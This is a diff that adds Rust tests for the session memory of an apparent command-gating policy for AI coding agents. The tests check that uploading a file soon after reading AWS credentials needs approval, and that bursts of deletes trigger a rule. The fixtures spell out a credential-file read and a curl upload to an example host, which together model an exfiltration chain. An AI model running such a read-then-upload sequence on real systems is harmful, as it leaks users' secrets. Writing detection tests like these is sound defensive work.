@@ -238,3 +238,98 @@ fn the_rule_list_names_every_rule_with_its_source() {
     assert!(infos.iter().all(|i| i.source.starts_with("builtin:")));
     assert!(infos.iter().all(|i| !i.disabled));
 }
+
+
+// ---------------------------------------------------------------------------
+// Session memory
+// ---------------------------------------------------------------------------
+
+/// Returns the case of a read of the AWS credential file.
+fn credential_read() -> common::Case {
+    exec(&["cat", "/home/dev/.aws/credentials"]).with_ancestry(&["bash", "claude"])
+}
+
+/// Returns the case of an upload of a file to another machine.
+fn upload() -> common::Case {
+    exec(&["curl", "-T", "report.txt", "https://files.example.com/u"])
+        .with_ancestry(&["bash", "claude"])
+}
+
+#[test]
+fn an_upload_after_a_credential_read_needs_approval() {
+    let policy = builtin();
+    let read = credential_read();
+    let send = upload();
+    let verdicts = common::play(&policy, &[(0, &read), (common::SECOND, &send)]);
+    assert_eq!(verdicts[0].decision, Decision::Allow);
+    assert_eq!(verdicts[1].decision, Decision::ApprovalRequired);
+    assert!(
+        ids(&verdicts[1]).contains(&"memory.exfil.after-credential-read".to_string()),
+        "{:?}",
+        ids(&verdicts[1])
+    );
+}
+
+#[test]
+fn each_half_of_the_credential_chain_alone_stays_quiet() {
+    let policy = builtin();
+    let send = upload();
+    let alone = common::play(&policy, &[(0, &send)]);
+    assert!(is_quiet(&alone[0]), "{:?}", ids(&alone[0]));
+
+    let read = credential_read();
+    let only_read = common::play(&policy, &[(0, &read)]);
+    assert_eq!(only_read[0].decision, Decision::Allow);
+}
+
+#[test]
+fn the_credential_chain_stops_counting_after_ten_minutes() {
+    let policy = builtin();
+    let read = credential_read();
+    let send = upload();
+    let verdicts = common::play(&policy, &[(0, &read), (900 * common::SECOND, &send)]);
+    assert!(is_quiet(&verdicts[1]), "{:?}", ids(&verdicts[1]));
+}
+
+#[test]
+fn a_burst_of_deletes_needs_approval_only_at_the_twentieth() {
+    let policy = builtin();
+    let delete = exec_in("/home/dev/app", &["rm", "-f", "build/tmp.o"]);
+    let steps: Vec<(u64, &common::Case)> = (0..20)
+        .map(|index| (index * common::SECOND, &delete))
+        .collect();
+    let verdicts = common::play(&policy, &steps);
+    for (index, verdict) in verdicts.iter().enumerate().take(19) {
+        assert!(is_quiet(verdict), "delete {index}: {:?}", ids(verdict));
+    }
+    assert_eq!(verdicts[19].decision, Decision::ApprovalRequired);
+    assert!(
+        ids(&verdicts[19]).contains(&"memory.filesystem.delete-burst".to_string()),
+        "{:?}",
+        ids(&verdicts[19])
+    );
+}
+
+#[test]
+fn twenty_deletes_over_an_hour_stay_quiet() {
+    let policy = builtin();
+    let delete = exec_in("/home/dev/app", &["rm", "-f", "build/tmp.o"]);
+    let steps: Vec<(u64, &common::Case)> = (0..20)
+        .map(|index| (index * 180 * common::SECOND, &delete))
+        .collect();
+    let verdicts = common::play(&policy, &steps);
+    for (index, verdict) in verdicts.iter().enumerate() {
+        assert!(is_quiet(verdict), "delete {index}: {:?}", ids(verdict));
+    }
+}
+
+#[test]
+fn the_same_actions_give_the_same_verdicts_two_times() {
+    let policy = builtin();
+    let read = credential_read();
+    let send = upload();
+    let steps: Vec<(u64, &common::Case)> = vec![(0, &read), (common::SECOND, &send)];
+    let first = common::play(&policy, &steps);
+    let second = common::play(&policy, &steps);
+    assert_eq!(first, second, "a second run must answer the same");
+}
